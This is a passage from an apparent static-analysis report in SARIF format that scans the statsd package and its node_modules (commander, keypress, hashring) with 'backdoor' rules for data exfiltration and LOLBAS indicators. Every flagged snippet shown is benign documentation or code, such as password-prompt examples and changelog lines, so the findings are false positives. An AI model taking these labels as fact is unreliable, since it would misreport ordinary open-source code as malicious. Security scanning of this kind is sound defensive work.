                      "text": "Prompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                      "markdown": "`Prompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 8,
                  "endLine": 208,
                  "endColumn": 16,
                  "snippet": {
                    "text": "Prompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                    "rendered": {
                      "text": "Prompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                      "markdown": "`Prompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 205,
                  "startColumn": 11,
                  "endLine": 205,
                  "endColumn": 19,
                  "snippet": {
                    "text": "});\n```\n\nPrompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n",
                    "rendered": {
                      "text": "});\n```\n\nPrompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n",
                      "markdown": "`});\n```\n\nPrompt for password with mask char \"*\":\n\n```js\nprogram.password('Password: ', '*', function(pass){\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 18,
                  "endLine": 199,
                  "endColumn": 26,
                  "snippet": {
                    "text": "Prompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                    "rendered": {
                      "text": "Prompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                      "markdown": "`Prompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 8,
                  "endLine": 199,
                  "endColumn": 16,
                  "snippet": {
                    "text": "Prompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                    "rendered": {
                      "text": "Prompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n",
                      "markdown": "`Prompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n  console.log('got \"%s\"', pass);\n  process.stdin.destroy();\n});\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 196,
                  "startColumn": 11,
                  "endLine": 196,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n## .password(msg[, mask], fn)\n\nPrompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n",
                    "rendered": {
                      "text": "\n## .password(msg[, mask], fn)\n\nPrompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n",
                      "markdown": "`\n## .password(msg[, mask], fn)\n\nPrompt for password without echoing:\n\n```js\nprogram.password('Password: ', function(pass){\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/Readme.md"
                },
                "region": {
                  "startLine": 194,
                  "startColumn": 4,
                  "endLine": 194,
                  "endColumn": 12,
                  "snippet": {
                    "text": "});\n```\n\n## .password(msg[, mask], fn)\n\nPrompt for password without echoing:\n\n",
                    "rendered": {
                      "text": "});\n```\n\n## .password(msg[, mask], fn)\n\nPrompt for password without echoing:\n\n",
                      "markdown": "`});\n```\n\n## .password(msg[, mask], fn)\n\nPrompt for password without echoing:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/History.md"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 19,
                  "endLine": 50,
                  "endColumn": 25,
                  "snippet": {
                    "text": "==================\n\n  * add `--foo=bar` support [arv]\n  * fix password on node 0.8.8. Make backward compatible with 0.6 [focusaurus]\n\n1.0.1 / 2012-08-03 \n==================\n",
                    "rendered": {
                      "text": "==================\n\n  * add `--foo=bar` support [arv]\n  * fix password on node 0.8.8. Make backward compatible with 0.6 [focusaurus]\n\n1.0.1 / 2012-08-03 \n==================\n",
                      "markdown": "`==================\n\n  * add `--foo=bar` support [arv]\n  * fix password on node 0.8.8. Make backward compatible with 0.6 [focusaurus]\n\n1.0.1 / 2012-08-03 \n==================\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/History.md"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 19,
                  "endLine": 164,
                  "endColumn": 27,
                  "snippet": {
                    "text": "==================\n\n  * Added mask support to `Command#password(str[, mask], fn)`\n  * Added `Command#password(str, fn)`\n\n0.0.1 / 2010-01-03\n==================\n",
                    "rendered": {
                      "text": "==================\n\n  * Added mask support to `Command#password(str[, mask], fn)`\n  * Added `Command#password(str, fn)`\n\n0.0.1 / 2010-01-03\n==================\n",
                      "markdown": "`==================\n\n  * Added mask support to `Command#password(str[, mask], fn)`\n  * Added `Command#password(str, fn)`\n\n0.0.1 / 2010-01-03\n==================\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/History.md"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 35,
                  "endLine": 163,
                  "endColumn": 43,
                  "snippet": {
                    "text": "0.0.2 / 2011-08-15 \n==================\n\n  * Added mask support to `Command#password(str[, mask], fn)`\n  * Added `Command#password(str, fn)`\n\n0.0.1 / 2010-01-03\n",
                    "rendered": {
                      "text": "0.0.2 / 2011-08-15 \n==================\n\n  * Added mask support to `Command#password(str[, mask], fn)`\n  * Added `Command#password(str, fn)`\n\n0.0.1 / 2010-01-03\n",
                      "markdown": "`0.0.2 / 2011-08-15 \n==================\n\n  * Added mask support to `Command#password(str[, mask], fn)`\n  * Added `Command#password(str, fn)`\n\n0.0.1 / 2010-01-03\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/History.md"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 21,
                  "endLine": 148,
                  "endColumn": 29,
                  "snippet": {
                    "text": "==================\n\n  * Changed: when the user enters nothing prompt for password again\n  * Fixed issue with passwords beginning with numbers [NuckChorris]\n\n0.0.4 / 2011-08-15 \n==================\n",
                    "rendered": {
                      "text": "==================\n\n  * Changed: when the user enters nothing prompt for password again\n  * Fixed issue with passwords beginning with numbers [NuckChorris]\n\n0.0.4 / 2011-08-15 \n==================\n",
                      "markdown": "`==================\n\n  * Changed: when the user enters nothing prompt for password again\n  * Fixed issue with passwords beginning with numbers [NuckChorris]\n\n0.0.4 / 2011-08-15 \n==================\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/History.md"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 53,
                  "endLine": 147,
                  "endColumn": 61,
                  "snippet": {
                    "text": "0.0.5 / 2011-08-18 \n==================\n\n  * Changed: when the user enters nothing prompt for password again\n  * Fixed issue with passwords beginning with numbers [NuckChorris]\n\n0.0.4 / 2011-08-15 \n",
                    "rendered": {
                      "text": "0.0.5 / 2011-08-18 \n==================\n\n  * Changed: when the user enters nothing prompt for password again\n  * Fixed issue with passwords beginning with numbers [NuckChorris]\n\n0.0.4 / 2011-08-15 \n",
                      "markdown": "`0.0.5 / 2011-08-18 \n==================\n\n  * Changed: when the user enters nothing prompt for password again\n  * Fixed issue with passwords beginning with numbers [NuckChorris]\n\n0.0.4 / 2011-08-15 \n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/History.md"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 11,
                  "endLine": 80,
                  "endColumn": 19,
                  "snippet": {
                    "text": "0.5.1 / 2011-12-20 \n==================\n\n  * Fixed `password()` for recent nodes. Closes #36\n\n0.5.0 / 2011-12-04 \n==================\n",
                    "rendered": {
                      "text": "0.5.1 / 2011-12-20 \n==================\n\n  * Fixed `password()` for recent nodes. Closes #36\n\n0.5.0 / 2011-12-04 \n==================\n",
                      "markdown": "`0.5.1 / 2011-12-20 \n==================\n\n  * Fixed `password()` for recent nodes. Closes #36\n\n0.5.0 / 2011-12-04 \n==================\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/History.md"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 8,
                  "endLine": 50,
                  "endColumn": 16,
                  "snippet": {
                    "text": "==================\n\n  * add `--foo=bar` support [arv]\n  * fix password on node 0.8.8. Make backward compatible with 0.6 [focusaurus]\n\n1.0.1 / 2012-08-03 \n==================\n",
                    "rendered": {
                      "text": "==================\n\n  * add `--foo=bar` support [arv]\n  * fix password on node 0.8.8. Make backward compatible with 0.6 [focusaurus]\n\n1.0.1 / 2012-08-03 \n==================\n",
                      "markdown": "`==================\n\n  * add `--foo=bar` support [arv]\n  * fix password on node 0.8.8. Make backward compatible with 0.6 [focusaurus]\n\n1.0.1 / 2012-08-03 \n==================\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/backends/console.js"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 29,
                  "endLine": 17,
                  "endColumn": 33,
                  "snippet": {
                    "text": "}\n\nConsoleBackend.prototype.flush = function(timestamp, metrics) {\n  console.log('Flushing stats at ', new Date(timestamp * 1000).toString());\n\n  var out = {\n    counters: metrics.counters,\n",
                    "rendered": {
                      "text": "}\n\nConsoleBackend.prototype.flush = function(timestamp, metrics) {\n  console.log('Flushing stats at ', new Date(timestamp * 1000).toString());\n\n  var out = {\n    counters: metrics.counters,\n",
                      "markdown": "`}\n\nConsoleBackend.prototype.flush = function(timestamp, metrics) {\n  console.log('Flushing stats at ', new Date(timestamp * 1000).toString());\n\n  var out = {\n    counters: metrics.counters,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/README.md"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 37,
                  "endLine": 66,
                  "endColumn": 41,
                  "snippet": {
                    "text": "keypress.enableMouse(process.stdout);\n\nprocess.stdin.on('mousepress', function (info) {\n  console.log('got \"mousepress\" event at %d x %d', info.x, info.y);\n});\n\nprocess.on('exit', function () {\n",
                    "rendered": {
                      "text": "keypress.enableMouse(process.stdout);\n\nprocess.stdin.on('mousepress', function (info) {\n  console.log('got \"mousepress\" event at %d x %d', info.x, info.y);\n});\n\nprocess.on('exit', function () {\n",
                      "markdown": "`keypress.enableMouse(process.stdout);\n\nprocess.stdin.on('mousepress', function (info) {\n  console.log('got \"mousepress\" event at %d x %d', info.x, info.y);\n});\n\nprocess.on('exit', function () {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/README.md"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 3,
                  "endLine": 25,
                  "snippet": {
                    "text": "\nInstall with `npm`:\n\n``` bash\n$ npm install keypress\n```\n\nOr add it to the `\"dependencies\"` section of your _package.json_ file.\n",
                    "rendered": {
                      "text": "\nInstall with `npm`:\n\n``` bash\n$ npm install keypress\n```\n\nOr add it to the `\"dependencies\"` section of your _package.json_ file.\n",
                      "markdown": "`\nInstall with `npm`:\n\n``` bash\n$ npm install keypress\n```\n\nOr add it to the `\"dependencies\"` section of your _package.json_ file.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/README.md"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 3,
                  "endLine": 25,
                  "snippet": {
                    "text": "\nInstall with `npm`:\n\n``` bash\n$ npm install keypress\n```\n\nOr add it to the `\"dependencies\"` section of your _package.json_ file.\n",
                    "rendered": {
                      "text": "\nInstall with `npm`:\n\n``` bash\n$ npm install keypress\n```\n\nOr add it to the `\"dependencies\"` section of your _package.json_ file.\n",
                      "markdown": "`\nInstall with `npm`:\n\n``` bash\n$ npm install keypress\n```\n\nOr add it to the `\"dependencies\"` section of your _package.json_ file.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/README.md"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 39,
                  "endLine": 14,
                  "endColumn": 45,
                  "snippet": {
                    "text": "but rather only when it is being used in conjuction with the `readline` (or by\nextension, the `repl`) module.\n\nThis module is the exact logic from the node `v0.8.x` releases ripped out into its\nown module.\n\n__Bonus:__ Now with mouse support!\n",
                    "rendered": {
                      "text": "but rather only when it is being used in conjuction with the `readline` (or by\nextension, the `repl`) module.\n\nThis module is the exact logic from the node `v0.8.x` releases ripped out into its\nown module.\n\n__Bonus:__ Now with mouse support!\n",
                      "markdown": "`but rather only when it is being used in conjuction with the `readline` (or by\nextension, the `repl`) module.\n\nThis module is the exact logic from the node `v0.8.x` releases ripped out into its\nown module.\n\n__Bonus:__ Now with mouse support!\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/README.md"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 6,
                  "endLine": 10,
                  "endColumn": 12,
                  "snippet": {
                    "text": "`process.stdin` would emit when it was a TTY. Some people discovered this hidden\ngem, and started using it in their own code.\n\nNow in Node `v0.8.x`, this `\"keypress\"` event does not get emitted by default,\nbut rather only when it is being used in conjuction with the `readline` (or by\nextension, the `repl`) module.\n\n",
                    "rendered": {
                      "text": "`process.stdin` would emit when it was a TTY. Some people discovered this hidden\ngem, and started using it in their own code.\n\nNow in Node `v0.8.x`, this `\"keypress\"` event does not get emitted by default,\nbut rather only when it is being used in conjuction with the `readline` (or by\nextension, the `repl`) module.\n\n",
                      "markdown": "``process.stdin` would emit when it was a TTY. Some people discovered this hidden\ngem, and started using it in their own code.\n\nNow in Node `v0.8.x`, this `\"keypress\"` event does not get emitted by default,\nbut rather only when it is being used in conjuction with the `readline` (or by\nextension, the `repl`) module.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/README.md"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 11,
                  "endLine": 6,
                  "endColumn": 17,
                  "snippet": {
                    "text": "### Make any Node ReadableStream emit \"keypress\" events\n\n\nPrevious to Node `v0.8.x`, there was an undocumented `\"keypress\"` event that\n`process.stdin` would emit when it was a TTY. Some people discovered this hidden\ngem, and started using it in their own code.\n\n",
                    "rendered": {
                      "text": "### Make any Node ReadableStream emit \"keypress\" events\n\n\nPrevious to Node `v0.8.x`, there was an undocumented `\"keypress\"` event that\n`process.stdin` would emit when it was a TTY. Some people discovered this hidden\ngem, and started using it in their own code.\n\n",
                      "markdown": "`### Make any Node ReadableStream emit \"keypress\" events\n\n\nPrevious to Node `v0.8.x`, there was an undocumented `\"keypress\"` event that\n`process.stdin` would emit when it was a TTY. Some people discovered this hidden\ngem, and started using it in their own code.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/keypress/README.md"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 12,
                  "endLine": 3,
                  "endColumn": 18,
                  "snippet": {
                    "text": "keypress\n========\n### Make any Node ReadableStream emit \"keypress\" events\n\n\nPrevious to Node `v0.8.x`, there was an undocumented `\"keypress\"` event that\n",
                    "rendered": {
                      "text": "keypress\n========\n### Make any Node ReadableStream emit \"keypress\" events\n\n\nPrevious to Node `v0.8.x`, there was an undocumented `\"keypress\"` event that\n",
                      "markdown": "`keypress\n========\n### Make any Node ReadableStream emit \"keypress\" events\n\n\nPrevious to Node `v0.8.x`, there was an undocumented `\"keypress\"` event that\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/benchmarks/benchmark.js"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 7,
                  "endLine": 76,
                  "endColumn": 12,
                  "snippet": {
                    "text": "(\n  new benchmark.Suite()\n).add('hashring', function(){\n  ring1.get('key');\n//}).add('hash_ring', function(){\n//  ring2.getNode('key');\n}).on('cycle', function cycle(e) {\n",
                    "rendered": {
                      "text": "(\n  new benchmark.Suite()\n).add('hashring', function(){\n  ring1.get('key');\n//}).add('hash_ring', function(){\n//  ring2.getNode('key');\n}).on('cycle', function cycle(e) {\n",
                      "markdown": "`(\n  new benchmark.Suite()\n).add('hashring', function(){\n  ring1.get('key');\n//}).add('hash_ring', function(){\n//  ring2.getNode('key');\n}).on('cycle', function cycle(e) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/benchmarks/benchmark.js"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 7,
                  "endLine": 54,
                  "endColumn": 12,
                  "snippet": {
                    "text": "(\n  new benchmark.Suite()\n).add('hashring', function(){\n  ring1.get('key' + Math.random());\n//}).add('hash_ring', function(){\n//  ring2.getNode('key' + Math.random());\n}).on('cycle', function cycle(e) {\n",
                    "rendered": {
                      "text": "(\n  new benchmark.Suite()\n).add('hashring', function(){\n  ring1.get('key' + Math.random());\n//}).add('hash_ring', function(){\n//  ring2.getNode('key' + Math.random());\n}).on('cycle', function cycle(e) {\n",
                      "markdown": "`(\n  new benchmark.Suite()\n).add('hashring', function(){\n  ring1.get('key' + Math.random());\n//}).add('hash_ring', function(){\n//  ring2.getNode('key' + Math.random());\n}).on('cycle', function cycle(e) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/CHANGELOG"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 26,
                  "endLine": 12,
                  "endColumn": 32,
                  "snippet": {
                    "text": "- Upgraded all dependencies to the latest versions.\n\nMay 17, 2014 (2.0.0)\n- Upgraded Nan and removed node 0.4 support.\n\nOct 16, 2013 (1.0.3)\n- Use the bindings module for proper DEBUG builds.\n",
                    "rendered": {
                      "text": "- Upgraded all dependencies to the latest versions.\n\nMay 17, 2014 (2.0.0)\n- Upgraded Nan and removed node 0.4 support.\n\nOct 16, 2013 (1.0.3)\n- Use the bindings module for proper DEBUG builds.\n",
                      "markdown": "`- Upgraded all dependencies to the latest versions.\n\nMay 17, 2014 (2.0.0)\n- Upgraded Nan and removed node 0.4 support.\n\nOct 16, 2013 (1.0.3)\n- Use the bindings module for proper DEBUG builds.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/connection-parse/test/parse.test.js"
                },
                "region": {
